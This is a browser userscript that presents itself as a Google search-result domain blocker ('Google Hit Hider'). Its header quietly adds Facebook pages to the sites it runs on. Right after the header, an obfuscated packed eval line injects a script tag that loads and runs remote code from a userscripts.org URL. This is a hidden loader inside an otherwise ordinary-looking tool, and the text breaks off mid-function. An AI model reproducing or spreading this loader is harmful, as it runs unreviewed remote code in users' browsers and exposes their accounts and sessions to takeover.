// ==UserScript==
// @name           Google Hit Hider by Domain Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      JeffersonScher
// @version        1.5.7
// @copyright      Copyright 2013 Jefferson Scher
// @license        CC BY http://creativecommons.org/licenses/by/3.0/
// @description    Block unwanted sites from your Google search results. For Firefox+Greasemonkey or Chrome+Tampermonkey. v1.5.7 2013-02-05
// @include        http*://www.google.tld/*
// @include        http*://news.google.tld/*
// @include        http*://images.google.tld/*
// @include        http*://video.google.tld/*
// @include        http*://encrypted.google.tld/*
// @include        http*://startpage.com/*
// @include        http*://*.startpage.com/*
// @include        http*://duckduckgo.com/*
// @require        http://www.jeffersonscher.com/gm/AnotherAutoUpdater.php?id=95205&days=1&var=GHHbD&show&v157
// @grant          GM_addStyle
// @grant          GM_getValue
// @grant          GM_setValue
// @grant          GM_registerMenuCommand
// @grant          GM_deleteValue
// @grant          GM_log
// @grant          GM_xmlhttpRequest
// ==/UserScript==
// DISCLAIMER:     Use at your own risk. Functionality and harmlessness cannot be guaranteed.

// == == == To override the style of the script's buttons and panes, edit the hiderStyles string in about:config == == ==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

GM_addStyle("div.ghhider{color:#888;} div.ghhider:hover{background-color:#eee;} " + 
  "button.ghhider{color:#555;background-color:#fcfcfc;font-family:sans-serif;font-size:0.85em;margin:auto 2px;border:1px solid #ccc;border-radius:4px;-moz-border-radius:4px;padding:2px 3px;} " +
  "button.ghhider:hover{color:#000;background:#ff8;} .ghh1time{background:#eee;} .inlinediv{display:inline;} .ghhdnone{display:none !important;} " +
  ".ghhpane{position:absolute;color:#333;background-color:#fcfcfc;border:1px solid #ccc;border-radius:4px;-moz-border-radius:4px;padding:0.25em 1.5em;font-size:13px;display:none} " +
  "#ghhsitelist, #ghhpbanlist{background:#fff;list-style-type:none;padding:0;margin:0;} " +
  "#ghhsitelist li,#ghhpbanlist li{width:100%;line-height:1.5em;padding:0;position:relative} " +
  ".ghhhost{display:block;padding:0 0.25em;cursor:pointer;} #ghhutil{text-align:center;margin:0.5em 0 1em 0;border:1px solid #ccc;border-radius:4px;-moz-border-radius:4px;padding:3px 0;} " +
  ".ghhinfo{font-size:12px;line-height:9px;position:absolute;top:0;right:0;z-index:1001;border:4px solid transparent;border-radius:4px;border-bottom-left-radius:8px;border-top-left-radius:8px;-moz-border-radius-bottomleft:8px;-moz-border-radius-topleft:8px;margin-top:1px;padding-left:1px} " +
  ".ghhdel{text-decoration:line-through;color:#333;} .ghhpb{text-decoration:none;color:#f00;} " +
  ".ghhblk{text-decoration:none;color:#333;} .ghhd{position:relative;line-height:1.2em;cursor:pointer;} " + 
  ".ghhindent{position:absolute;left:350px;top:-3px;} #btnedit p{margin:2px 4px 4px 4px;} #ghhblockform input[type='radio'], #ghhmngform input[type='radio']{vertical-align:bottom;margin-top:5px;margin-bottom:1px} " +
  ".ghhtbl{border:1px solid black;border-collapse:collapse} .ghhtbl td, .ghhtbl th{border:1px solid black;padding:2px 4px;} " +
  "#ghhtsdiv{margin:0 -1.5em;padding:0 3px 0 8px;border-bottom:1px solid #ccc;} #ghhtstrip{padding-bottom:0;} " +
  "#ghhtstrip button{color:#555;background-color:#f5f5f5;margin:0 2px 0 0;border:1px solid #ccc;padding:1px 2px;height:22px;border-radius:2px;-moz-border-radius:2px;} " +
  "#ghhtstrip .ghhCurTab{background-color:#fcfcfc;border-bottom-color:#fcfcfc;} .ghhtab {margin-top:1em;height:17em;overflow-y:scroll;border:1px solid #333;} " +
  "#mflists>div>p{margin:1em 0;} #ghhmngform{position:fixed;top:90px;right:0;z-index:1001;}");
GM_addStyle("@media print {button.ghhider{display:none;}}");

// Style override example (use about:config): .ghhd{font-size:0.8em;text-decoration:line-through;}
var custSty = GM_getValue("hiderStyles");
if (!custSty || custSty.length == 0){
  GM_setValue("hiderStyles","");
} else {
  GM_addStyle(custSty);
}

var currentG;
if (location.host.indexOf("google.") > -1) currentG = location.host.substr(location.host.indexOf("google."));
else currentG = location.hostname;

// == == == Globals for preferences == == ==
var blist, defaultTxts, txtsPref, txts, defaultPrefs, ghhPrefs, ghhPrefO, showYN, mpopen, mbstyle, bbstyle, bbttip, addAt, listchgs, bLUopen, bAggress, bAJAX, bMutOb, pref1click, betatest, MutOb, chgMon, opts, kids;
blist = GM_getValue("hideyhosts");
if (!blist || blist.length == 0){
  blist = "|bigresource.com:t|";
  GM_setValue("hideyhosts",blist);
} else {
  if (blist.substr(0,1) != "|") blist = "|" + blist;
  if (blist.indexOf(":") < 0) convertFormat();
}
defaultTxts = {
  "block":["block","Button next to the result title to call up the block dialog"],
  "unblock":["Unblock","Green button in results to remove a site from the block list"],
  "onetime":["Show Hit","Yellow button in results to show a result temporarily"],
  "pban":["Perma-ban","Red button to move a site to the perma-ban list"],
  "shownotc":["Show Notices","Button to set the preference for notices to show them"],
  "hidenotc":["Hide Notices","Button to set the preference for notices to hide them"],
  "okbtn":["Block Site","Button in the block dialog to block the selected domain"],
  "cancelbtn":["Cancel","Button in the block dialog to cancel out with making changes"],
  "savebtn":["Save Lists","Button in the management pane to update the block and perma-ban lists"],
  "closebtn":["Close","Button in the management pane to close the pane"],
  "okPbtn":["Perma-ban","Button in the block dialog to perma-ban the selected domain"],
  "cancelMbtn":["Manage Hiding","Button in the block dialog to open the management pane"],
  "mngbtn":["Manage Hiding","Button on the right side to open the management pane"],
  "eximbtn":["Export","Button in the management pane to export the block list"],
  "utilbtn":["List Util","Button in the management pane to open the utility panel"],
  "sortbtn":["Sort","Button in the management pane to sort the block list"],
  "unwwwbtn":["Un-www","Button in the management pane to strip www from blocked domains"],
  "dedupbtn":["De-Dup","Button in the management pane to de-duplicate the block list"],
  "impobtn":["Import","Button in the management pane to import domains into the block list"],
  "sharebtn":["Share","Button in the management pane to post block list to the web"]
};
txtsPref = GM_getValue("textstrings");
if (!txtsPref || txtsPref.length == 0){
  txts = defaultTxts;
  GM_setValue("textstrings",JSON.stringify(txts));
} else {
  if (txtsPref.indexOf(":[") == -1 || txtsPref.indexOf("mngbtn") == -1 || 
      txtsPref.indexOf("eximbtn") == -1 || txtsPref.indexOf("utilbtn") == -1 || 
      txtsPref.indexOf("impobtn") == -1){
    convertTxts(txtsPref);
  } else {
    txts = JSON.parse(txtsPref);
  }
}
defaultPrefs = {
  "shownotc":["Y","Show hit notices(Y|N)"],
  "mngpaneopen":["Y-N","Persistence enabled(Y|N),Pane was open(Y|N),Last tab number(1-4)"],
  "mngbtnstyle":["both-ifrN-R-P-T","Display Manage Hiding button and Block buttons(mng|blk|both),In iframes(ifrN|ifrY),Position(R,T,B),Block button display(P,M),Block button tooltips(Y|N)"],
  "addtolistpos":["end","Where to add new hits to block lists(end|top|sort)"],
  "aggressiveblock":["none","Which domains to default to shorter form(none|all|www)"],
  "usemutation":["on-Y","Listen for mutation events(on|off),Use DOM4 Mutation Observer(Y|N)"],
  "oneclick":["N-N","One-click blocking(Y|N),Goes to Perma-ban(Y|N)"],
  "runbeta":["N","Enable incompletely tested features (Y|N)"],
  "reserved2":["X","Y"]
};
ghhPrefs = GM_getValue("ghhprefs");
if (!ghhPrefs || ghhPrefs.length == 0){
  convertPrefs(defaultPrefs, "true");
} else {
  if (ghhPrefs.indexOf("reserved1")>-1){
    convertPrefs(defaultPrefs, "false");
  } else {
    ghhPrefO = JSON.parse(ghhPrefs);
  }
}
showYN = ghhPrefO.shownotc[0];
mpopen = ghhPrefO.mngpaneopen[0];
mbstyle = ghhPrefO.mngbtnstyle[0];
if (mbstyle.split("-")[0] == "mng") toggleBlockHiders("H");
if (mbstyle.split("-").length < 3){
  GM_addStyle("#ghhMngBtn {position:fixed;top:200px;right:-2.8em;-moz-transform:rotate(-90deg);"+
    "border-bottom:0;border-bottom-left-radius:0;border-bottom-right-radius:0;-moz-border-radius-bottomleft:0;-moz-border-radius-bottomright:0;padding:6px 0 6px 0;z-index:100;}");
} else {
  switch (mbstyle.split("-")[2]){
    case "B":
      GM_addStyle("#ghhMngBtn {position:fixed;bottom:0;right:2px;"+
        "border-bottom:0;border-bottom-left-radius:0;border-bottom-right-radius:0;-moz-border-radius-bottomleft:0;-moz-border-radius-bottomright:0;padding:6px 0 6px 0;z-index:100;}");
      break;
    case "T":
      GM_addStyle("#ghhMngBtn {margin:0;padding:4px 6px;z-index:1001;}");
      if (document.querySelector("#appbar ol")){
        window.setTimeout(function(){document.querySelector("#appbar ol#ab_ctls").appendChild(document.getElementById("ghhMngBtn"))}, 1000);
        window.setTimeout(function(){var liNew = document.createElement("li");liNew.className="ab_ctl";liNew.appendChild(document.getElementById("ghhMngBtn"));document.querySelector("ol#ab_ctls").appendChild(liNew);}, 1500);
      } else {
        window.setTimeout(function(){if (document.querySelector("#appbar ol")){var liNew = document.createElement("li");liNew.className="ab_ctl";liNew.appendChild(document.getElementById("ghhMngBtn"));document.querySelector("ol#ab_ctls").appendChild(liNew);}else{document.getElementById("ghhMngBtn").setAttribute("style","position:absolute;top:8em;right:0")}}, 1500);
      }
      break;
    default:
      GM_addStyle("#ghhMngBtn {position:fixed;top:200px;right:-2.8em;-moz-transform:rotate(-90deg);-webkit-transform:rotate(-90deg);"+
        "border-bottom:0;border-bottom-left-radius:0;border-bottom-right-radius:0;-moz-border-radius-bottomleft:0;-moz-border-radius-bottomright:0;padding:6px 0 6px 0;z-index:100;}");
  }
}
if (mbstyle.split("-").length > 3) bbstyle = mbstyle.split("-")[3];
else bbstyle = "P";
if (mbstyle.split("-").length > 4) bbttip = mbstyle.split("-")[4];
else bbttip = "T";
addAt = ghhPrefO.addtolistpos[0];
listchgs = 0;
bLUopen = "N";
bAggress = ghhPrefO.aggressiveblock[0];
bAJAX = ghhPrefO.usemutation[0].split("-")[0];
if (ghhPrefO.usemutation[0].split("-").length > 1) bMutOb = ghhPrefO.usemutation[0].split("-")[1];
else bMutOb = "Y";
pref1click = ghhPrefO.oneclick[0];
betatest = ghhPrefO.runbeta[0];
if (document.body){
  // Add buttons, hide unwanted domains
  hidehits(null,false);
  // Special results layout
  if (betatest == "Y"){
    var itbl = document.querySelector("#res .images_table");
    if (itbl) hidebasic(itbl);
  }
  // Create skeleton of manage form
  if (!document.getElementById("ghhmngform")) addManageForm();
  // Add manage button
  if (!document.getElementById("ghhMngBtn") && mbstyle.split("-")[0] != "blk"){
    if (currentG.indexOf("google") > -1 && document.getElementById("res")) addMngBtn();
    if (currentG.indexOf("google") < 0) addMngBtn();
  }
  // Show pane if last open
  if (mpopen.substr(0,3) == "Y-Y") showManageForm("mngform");
  // Add menu item
  GM_registerMenuCommand("Manage Hiding", showManageForm);
  // Create block form
  if (!document.getElementById("ghhblockform")) addBlockForm();
  // Watch for changes that could be new instant or AJAX search results
  if (bAJAX == "on") setMutationWatch();
}
function setMutationWatch(){
  // Prefer MutationObserver (Firefox 14+) over Mutation Events
  MutOb = (window.MutationObserver) ? window.MutationObserver : window.WebKitMutationObserver;
  if (MutOb && bMutOb == "Y"){
    chgMon = new MutOb(function(mutationSet){
      mutationSet.forEach(function(mutation){
        for (var i=0; i<mutation.addedNodes.length; i++){
          if (mutation.addedNodes[i].nodeType == 1){
            checkNode(mutation.addedNodes[i]);
          }
        }
      });
    });
    // attach chgMon to document.body
    opts = {childList: true, subtree: true};
    chgMon.observe(document.body, opts);
  } else { // Legacy browser support
    document.body.addEventListener("DOMSubtreeModified", checkOlist, false);
  }
}
// == == == Main Event Loops == == ==
var ignoreNodeNames = "|BODY|#text|#comment|INPUT|BUTTON|SCRIPT|LI|A|FORM|";
var ignoreIds = "|leftnav|leftnavc|foot|ghhtemp|ghhblockform|ghhmanageform|ghhsitelist|ghhpbanlist|rhs|rhscol|";
var ignoreClass = "|ghhider|inlinediv|ghh1time|";
var t_ap;

function checkOlist(e){ // Check for new results
  // AutoPager extension
  if (e.target.id){if (e.target.id == "navcnt"){if (e.target.getElementsByClassName("ghhider").length>0){
    if (t_ap) window.clearTimeout(t_ap);
    t_ap = window.setTimeout(refreshListeners, 500);
    return;
  }}}
  // Ignore events on some elements
  if (ignoreNodeNames.indexOf("|"+e.target.nodeName+"|") > -1) return;
  if (e.target.hasAttribute("id")){if (ignoreIds.indexOf("|"+e.target.id+"|") > -1) return;}
  if (e.target.hasAttribute("class")){
    if (ignoreClass.indexOf("|"+e.target.className+"|") > -1) return;
    if (e.target.className.indexOf("goog-date") > -1) return;
  }
  // Standard results layout
  var liels = e.target.getElementsByTagName("li"); 
  if (!liels) return;
  if (liels.length == 0) return;
  // Hide hits if list is visible now
  var rslt = document.querySelectorAll("#res");
  if (rslt){
    if (window.getComputedStyle(rslt[rslt.length-1],null).getPropertyValue("visibility") == "visible" && 
        window.getComputedStyle(rslt[rslt.length-1],null).getPropertyValue("display") != "none"){
      var nlist = rslt[rslt.length-1].getElementsByTagName("li");
      hidehits(nlist,false);
    }
  }
}
function checkNode(el){
  // AutoPager extension
  if (document.querySelector("#navcnt")){
    if (t_ap) window.clearTimeout(t_ap);
    t_ap = window.setTimeout(refreshListeners, 500);
  }
  if (el.nodeName == "LI") var nlist = [el];
  else var nlist = el.querySelectorAll('li');
  if (currentG.indexOf("google") < 0) var nlist = el.querySelectorAll('div.result, div.links_main');
  if (nlist.length > 0) hidehits(nlist,false);
}
function hidehits(liels,ovrd){
  if (!liels){
    liels = document.querySelectorAll("#res li");
    if (!liels) liels = document.querySelectorAll("#ires li");
    if (currentG.indexOf("google") < 0) liels = document.querySelectorAll('div#results > div.result, div#links > div.results_links_deep');
    if (!liels) return;
  }
  //GM_log("liels.length="+liels.length); //DEBUG ONLY
  var hosts, hiders, nhider, i, j, k, hid, ael, dom, dompart, btn, apar, dgone, pban, linkwidth;
  hosts = blist; 
  for (i=0; i<liels.length; i++){
    if ((liels[i].parentNode.nodeName == "OL" ||
        liels[i].parentNode.nodeName == "TD" ||
        (currentG.indexOf("google") < 0 && liels[i].parentNode.nodeName == "DIV")) && 
        liels[i].className.indexOf("gbt")!=0 && 
        liels[i].className.indexOf("gplusgrid")<0 &&
        liels[i].className.indexOf("mitem")<0) {
      hiders = liels[i].getElementsByClassName("ghhider");
      nhider = hiders.length;
      if (nhider == 0 || ovrd == true){ // skip if a button is there
        hid = false;
        ael = liels[i].querySelector("h3 a"); // first link (not useful for video or book blocks), <h3> preferred
        if (!ael) ael = liels[i].querySelector("h2 a");
        if (!ael) ael = liels[i].querySelector("a");
        if (liels[i].className.indexOf("videobox")>-1) ael = liels[i].querySelectorAll("td")[1].querySelector("a"); //video page
        if (ael){if(ael.hasAttribute("href")){if (ael.getAttribute("href").indexOf("http")==0 || ael.getAttribute("href").indexOf("/interstitial")==0 || 
            ael.getAttribute("href").indexOf("/url?q=")==0 || (ael.getAttribute("href").indexOf("/aclk?")==0 && liels[i].className.indexOf("psli")>-1)){
          dom = ael.getAttribute("href").substr(ael.getAttribute("href").indexOf("http"));
          if (dom.indexOf(currentG+"/aclk?")>-1) dom = ael.getAttribute("href").substr(ael.getAttribute("href").indexOf("http", 10));
          dom = dom.split("/")[2];
          if (dom.indexOf(":")> -1) dom = dom.substr(0,dom.indexOf(":")); // Strip port number
          dompart = dom;
          while (dompart.indexOf(".")> -1) {
            if (hosts.indexOf("|"+dompart+":")>-1) { // These domains suck
              if (nhider > 0){  // Remove old buttons, notices, etc.
                for (k=hiders.length-1; k>=0; k--){
                  hiders[k].parentNode.removeChild(hiders[k]);
                  nhider = liels[i].getElementsByClassName("ghhider").length;
                }
              }
              if (liels[i].className.indexOf("ghh1time")<0){
                if (hosts.indexOf("|"+dompart+":p")<0) {  // Regular block
                  if (showYN=="Y"){
                    if (liels[i].className.indexOf("results_links_deep")>-1){
                      replaceHit(dompart,ael,liels[i].querySelector(".links_main"),"");
                    }
                    else replaceHit(dompart,ael,liels[i],"");
                  }
                  else replaceHit(dompart,ael,liels[i],"none");
                } else { // Perma-ban
                  liels[i].setAttribute("blockhidden",dompart);
                  if (currentG.indexOf("google") < 0 && liels[i].className.indexOf("ghhdnone")<0){
                    liels[i].className += " ghhdnone";
                    if (liels[i].className.indexOf("links_main")>-1) liels[i].parentNode.className += " ghhdnone";
                  }
                }
                if (currentG.indexOf("google") < 0 && liels[i].className.indexOf("results_links_deep")>-1) kids = liels[i].children[1].children;
                else kids = liels[i].children;
                for (j=0; j<kids.length; j++){ // Hide Google result
                  if (kids[j].className.indexOf("ghhider")<0 && kids[j].className.indexOf("ghhdnone")<0){
                    if (kids[j].className.length > 0) kids[j].className += " ghhdnone";
                    else kids[j].className = "ghhdnone";
                  }
                }
              }
              if (liels[i].className.indexOf("psli")>-1) liels[i].style.padding = "0"; // Shopping results
              hid = true;
              break;
            }
            else {
              dompart = dompart.slice(dompart.indexOf(".")+1);
            }
          }
          if (hid == false && nhider > 1) { // Remove previous block & reset nhider
            liels[i].removeChild(liels[i].children[0]);
            // Clean up unblocked one-times
            if (liels[i].className.indexOf("ghh1time")>-1){
              liels[i].className = liels[i].className.replace(/\s*ghh1time/,"");
              dgone = liels[i].getElementsByClassName("ghhd")[0];
              if (dgone) dgone.parentNode.removeChild(dgone);
              dgone = liels[i].getElementsByClassName("inlinediv")[0];
              if (dgone) dgone.parentNode.removeChild(dgone);
            }
            nhider = liels[i].getElementsByClassName("ghhider").length;
          }
          if (hid == false && nhider == 0) { // Not blocked, insert block button
            // First, remove hiding for unblocked domains
            if (currentG.indexOf("google") < 0 && liels[i].className == "results_links_deep") kids = liels[i].children[1].children;
            else kids = liels[i].children;
            for (j=0; j<kids.length; j++){
              if (kids[j].className.indexOf("ghhdnone")>-1){
                kids[j].className = kids[j].className.replace(/\s*ghhdnone/, "");
              }
            }
            if (liels[i].hasAttribute("blockhidden")){
              liels[i].removeAttribute("blockhidden");
              liels[i].className = liels[i].className.replace(/\s*ghhdnone/, "");
              if (currentG.indexOf("google") < 0 && liels[i].className.indexOf("links_main")>-1) liels[i].parentNode.className.replace(/\s*ghhdnone/, "");
            }
            if (liels[i].hasAttribute("blocknotice")) liels[i].removeAttribute("blocknotice");
            // Insert block button
            apar = ael;
            if (!apar.nextElementSibling){
              if (apar.parentNode.nodeName != "LI" && 
                  apar.parentNode.nodeName != "TD" && 
                  apar.parentNode.nodeName != "H2") apar = apar.parentNode;
            }
            if (apar != undefined) { if (dom.indexOf(currentG)<0 && 
                (liels[i].parentNode != document.querySelector("#tads ol")) && 
                (liels[i].parentNode != document.querySelector("#bottomads ol")) && 
                (liels[i].parentNode != document.querySelector("#ads div")) && 
                (liels[i].parentNode != document.querySelector("#rhs ol"))){
              btn = document.createElement("button");
              btn.appendChild(document.createTextNode(txts.block[0]));
              btn.className="ghhider ghhb";
              btn.setAttribute("meta",dom);
              if (pref1click.substr(0,1) == "Y" && mbstyle.split("-")[4] == "Y"){ //BUG: for 1-click with aggressive (subdomain) settings, dom will be incorrect
                if (currentG.indexOf("google") > -1) btn.setAttribute("title","Block "+dom+" / SHIFT+click to display block form / ALT+click to omit");
                else btn.setAttribute("title","Block "+dom+" / SHIFT+click to display block form");
              } else if (mbstyle.split("-")[4] == "Y"){
                if (currentG.indexOf("google") > -1) btn.setAttribute("title","Block "+dom+" / Show block form / ALT+click to omit");
                else btn.setAttribute("title","Block "+dom+" / Show block form");
              }
              btn.addEventListener("click",showbfd,true);
              if (apar.nextSibling) apar.parentNode.insertBefore(btn,apar.nextSibling);
              else apar.parentNode.appendChild(btn);
              // Reposition button to prevent wrapping 3/25/2012
              if (apar.nodeName == "H3"){
                linkwidth = apar.querySelector('a').offsetWidth;
                if (apar.offsetLeft > 0 && apar.offsetLeft < 50) linkwidth += apar.offsetLeft; // fix rare weirdness 2/4/2013
                if (apar.parentNode.offsetWidth - linkwidth - btn.offsetWidth > 4) {
                  apar.style.display = "inline"; // button wraps to end of link
                } else {
                  if (linkwidth > 509) linkwidth = 509; // fix rare weirdness 2/4/2013
                  btn.setAttribute("style","position:absolute;top:0;right:"+((-1 * btn.offsetWidth)+(apar.parentNode.offsetWidth-linkwidth)-3)+"px;margin-right:0;z-index:100;"); // position past end of link
                  if (apar.parentNode.nodeName=="LI"||apar.parentNode.nodeName=="DIV") apar.parentNode.style.position="relative";
                }
                apar.querySelector('a').setAttribute("title",apar.querySelector('a').textContent); // full link text tooltip
              }
              // Implement Mouseover Option 6/22/2012
              if (bbstyle == "M") {
                btn.style.visibility = "hidden";
                liels[i].addEventListener("mouseover",togglebbtn,false);
                liels[i].addEventListener("mouseout",togglebbtn,false);
              }
              // Avoid unhiding garbage span 5/25/2012
              for (j=0; j<liels[i].children.length; j++){
                if (liels[i].children[j].className.indexOf("ghhider")<0){
                  if (liels[i].children[j].style.display=="none") liels[i].children[j].setAttribute("wasdisplaynone","wasdisplaynone");
                }
              }
            }}
          }
        }}}
      }
    } else { // BETA - STANDARD image results - doesn't yet support BASIC image results
      if (liels[i].parentNode.nodeName == "UL" && betatest == "Y"){
        if (!liels[i].hasAttribute("block")){ // skip if previously processed
          liels[i].setAttribute("block","normal");
          ael = liels[i].getElementsByTagName("a")[0];
          if (ael){if(ael.hasAttribute("href")){if (ael.getAttribute("href").indexOf("imgrefurl")>-1){
            dom = ael.href.match(/imgrefurl=([^&]+)/)[1].split("/")[2];
            if (dom.indexOf(":")> -1) dom = dom.substr(0,dom.indexOf(":")); // Strip port number
            dompart = dom;
            while (dompart.indexOf(".")> -1) {
              if (hosts.indexOf("|"+dompart+":")>-1) { // These domains suck
                liels[i].setAttribute("block","hidden");
                liels[i].style.display = "none";
                break;
              } else {
                dompart = dompart.slice(dompart.indexOf(".")+1);
              }
            }
          }}}
        }
      }
    }
  }
  if (!document.getElementById("ghhMngBtn") && mbstyle.split("-")[0] != "blk" && document.getElementById("res")) addMngBtn();
  if (document.getElementsByClassName("unbtn").length > 1) undupMngBtn();
  if (betatest == "Y" && currentG !=0){ // BETA - NEW - v1.5.2
    // If there are more than two completely invisible results, modify the query to exclude the first hidden site
    var invis = document.querySelectorAll("li[blockhidden]");
    if (invis.length >= 3) reQry("+-site:"+invis[0].getAttribute("blockhidden"));
  }
}
function replaceHit(sdomain,oa,oli,ddis){
  var fc, dnew, dset, btn;
  fc = oli.querySelector('h3, h2');
  if (!fc) fc = oli.firstChild;
  if (fc.nodeName=="DIV" && fc.className.indexOf("ghhider")>-1) return;
  dnew = document.createElement("div");
  dnew.appendChild(document.createTextNode(oa.textContent+" on "+sdomain));
  dnew.className="ghhider ghhd";
  dnew.setAttribute("title","Click to view, unblock or Perma-ban");
  dnew.style.display = ddis;
  if (ddis == "none"){
    oli.setAttribute("blockhidden",sdomain);
    if (oli.hasAttribute("blocknotice")) oli.removeAttribute("blocknotice");
  } else {
    oli.setAttribute("blocknotice",sdomain);
    if (oli.hasAttribute("blockhidden")) oli.removeAttribute("blockhidden");
    oli.className = oli.className.replace(/\s*ghhdnone/, "");
    if (oli.parentNode.className.indexOf("results_links_deep")>-1){
      oli.parentNode.setAttribute("blocknotice",sdomain);
      if (oli.parentNode.hasAttribute("blockhidden")) oli.parentNode.removeAttribute("blockhidden");
      oli.parentNode.className = oli.parentNode.className.replace(/\s*ghhdnone/, "");
    }
  }
  dnew.addEventListener("click",reshow,false);
  oli.insertBefore(dnew,oli.firstChild);
  dset = document.createElement("div");
  dset.className = "ghhider ghhindent";
  dset.setAttribute("dom",sdomain);
  dset.style.display = "none";
  btn = document.createElement("button");
  btn.appendChild(document.createTextNode(txts.unblock[0]));
  btn.className="ghhider";
  btn.setAttribute("title","Unblock this site");
  btn.style.backgroundColor="#9f6";
  btn.addEventListener("click",unblock,false);
  dset.appendChild(btn);
  btn = document.createElement("button");
  btn.appendChild(document.createTextNode(txts.pban[0]));
  btn.className="ghhider";
  btn.setAttribute("title","Permanently hide this site");
  btn.style.backgroundColor="#f66";
  btn.addEventListener("click",permban,false);
  dset.appendChild(btn);
  btn = document.createElement("button");
  btn.appendChild(document.createTextNode("close"));
  btn.className="ghhider";
  btn.setAttribute("title","Re-hide this hit");
  btn.style.backgroundColor="#eee";
  btn.addEventListener("click",rehide,false);
  dset.appendChild(btn);
  dnew.appendChild(dset);
  if (dnew.parentNode.style.overflow == "hidden" || dnew.parentNode.style.overflowX == "hidden"){
    dnew.insertBefore(document.createElement("br"), dnew.firstChild);
  }
  dset.addEventListener("click",ghhkillevent,false);
  if (oli.className.indexOf("psli")>-1) dnew.style.margin = "1em 0"; // Shopping results
}
function hidebasic(tbl){ // BASIC IMAGE RESULTS, BETA ONLY, NON-AJAX
  var hosts, tds, i, j, k, hid, ael, dom, dompart, btn, apar, dgone;
  hosts = blist;
  tds = tbl.querySelectorAll("td");
  for (i=0; i<tds.length; i++){
    ael = tds[i].querySelector("a");
    if (ael){if(ael.hasAttribute("href")){if (ael.getAttribute("href").indexOf("imgrefurl=")>-1){
      dom = ael.getAttribute("href").substr(ael.getAttribute("href").indexOf("imgrefurl=")+7).split("/")[2];
      if (dom.indexOf(":")> -1) dom = dom.substr(0,dom.indexOf(":")); // Strip port number
      dompart = dom;
      while (dompart.indexOf(".")> -1) {
        if (hosts.indexOf("|"+dompart+":")>-1) { // These domains suck; mark the cell for now
          if (hosts.indexOf("|"+dompart+":p")>-1 || showYN=="N") tds[i].setAttribute("ghhaction","delete");
          else tds[i].setAttribute("ghhaction","notice");
          break;
        } else {
          dompart = dompart.slice(dompart.indexOf(".")+1);
        }
      }
    }}}
  }
  for (i=0; i<tds.length; i++){
    switch (tds[i].getAttribute("ghhaction")){
      case "delete":
        // TODO implement deletion
        tds[i].innerHTML = "delete cell";
        break;
      case "notice":
        // TODO implement clickable notices
        tds[i].style.textDecoration = "line-through";
        tds[i].style.opacity = "0.3";
        break;
      default:
        // TODO add block button
    }
  }
}
// == == == Other Functions == == == 
function reshow(e){   // Show hit without unblocking
  var liel, ael, dabs, k;
  liel = e.target.parentNode;
  while (currentG.indexOf("google") > -1 && liel.nodeName != "LI"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") return;
  }
  while (currentG.indexOf("google") < 0 && liel.nodeName != "DIV"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") return;
  }
  liel.className += " ghh1time";
  // Hide notice, move action buttons, then show hit
  e.target.style.display="none";
  ael = liel.querySelector("h3 a");
  if (!ael) ael = liel.querySelector("span.tl a"); // summarized news result
  if (!ael) ael = liel.querySelector("a"); // other
  if (liel.className.indexOf("videobox")>-1) ael = liel.querySelectorAll("td")[1].querySelector("a"); //video page
  dabs = e.target.firstElementChild;
  if (ael.parentNode.nextSibling) ael.parentNode.parentNode.insertBefore(dabs,ael.parentNode.nextSibling);
  else ael.parentNode.parentNode.appendChild(dabs);
  dabs.className = "inlinediv";
  dabs.removeAttribute("style");
  if (dabs.nextElementSibling) if (dabs.nextElementSibling.className.indexOf("ghhider") == 0 || dabs.nextElementSibling.innerHTML == "block") dabs.parentNode.removeChild(dabs.nextElementSibling);
  for (k=1; k<liel.children.length; k++){
    liel.children[k].className = liel.children[k].className.replace(/\s*ghhdnone/, "");
  }
  e.stopPropagation();
}
// Hide or Show hit notices
function updtpref(e){
  var btns, j, hds, s;
  if (showYN == "Y"){
    if (confirm("No longer show titles or buttons for suppressed results?")){
      ghhPrefO.shownotc[0] = "N";
      GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
      showYN = ghhPrefO.shownotc[0];
      togHiderDivs("no");
    }
  } else {
    hds = document.getElementsByClassName("ghhd");
    if (hds.length > 0) s = (hds.length == 1) ? "is 1 blocked hit" : "are "+hds.length+" blocked hits";
    else s = "are no blocked hits";
    if (confirm("Show titles and buttons for suppressed results? (There "+s+" on this page.)")){
      ghhPrefO.shownotc[0] = "Y";
      GM_setValue("ghhprefs",JSON.stringify(ghhPrefO));
      showYN = ghhPrefO.shownotc[0];
      togHiderDivs("yes");
    }
  }
  fixShowHideBtn();
  e.target.blur();
}
function fixShowHideBtn(){
  var chkMP = document.getElementById("chkshownotc");
  var chkBF = document.getElementById("chkshownotcbf");
  if (showYN == "Y"){
    chkMP.setAttribute("checked","checked");
    chkMP.checked = true;
    if (chkBF){
      chkBF.setAttribute("checked","checked");
      chkBF.checked = true;
    }
  } else {
    chkMP.removeAttribute("checked");
    chkMP.checked = false;
    if (chkBF){
      chkBF.removeAttribute("checked");
      chkBF.checked = false;  
    }
  }
}
function togHiderDivs(sShow){
  var dh, i;
  dh = document.getElementsByClassName("ghhider");
  for(i=0;i<dh.length;i++) {
    if (dh[i].nodeName == "DIV" && dh[i].className.indexOf("ghhindent")<0) {
      if (sShow == "yes") dh[i].style.display = "";
      else dh[i].style.display = "none";
    }
  }
}
// Remove domain from the block list
function unblock(e){
  var elPar, sdom, slist, liel, tgt;
  elPar = e.target.parentNode;
  sdom = elPar.getAttribute("dom");
  if (!sdom || sdom.length<4){
    alert("Problem with domain to unblock");
    return;
  }
  slist = GM_getValue("hideyhosts");
  if (slist.substr(0,1) != "|") slist = "|" + slist;
  slist = slist.replace("|"+sdom+":t","");
  GM_setValue("hideyhosts",slist);
  blist = GM_getValue("hideyhosts");
  liel = elPar.parentNode;
  while (currentG.indexOf("google") > -1 && liel.nodeName != "LI"){
    liel=liel.parentNode;
    if (liel.nodeName == "BODY") break;
  }
  if (currentG.indexOf("google") > -1 && liel.nodeName =="LI" && liel.className.indexOf("ghh1time")>-1){
    liel.className = liel.className.replace(/\s*ghh1time/,"");
